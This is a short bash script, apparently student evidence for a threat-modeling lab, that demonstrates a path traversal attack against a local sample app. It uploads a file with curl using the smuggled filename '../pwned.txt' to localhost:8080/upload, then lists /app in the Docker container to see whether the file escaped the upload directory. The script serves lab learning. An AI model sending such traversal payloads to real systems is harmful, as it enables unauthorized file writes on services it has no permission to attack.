#!/bin/bash
# Task 8 evidence: path traversal through /upload (run from labs/week01-threat-modeling)
cd "$(dirname "$0")"
echo "===== IDENTITY STAMP ====="
printf '%s | %s | ' "$(whoami)" '66991011'; date '+%F %T %Z'
echo "===== ATTACK: upload a file named ../pwned.txt ====="
echo "owned" > /tmp/payload.txt
curl -s -F "file=@/tmp/payload.txt;filename=../pwned.txt" http://localhost:8080/upload; echo
echo "===== Did it escape uploads/? (contents of /app inside the container) ====="
docker compose exec -T sample-app ls -la /app
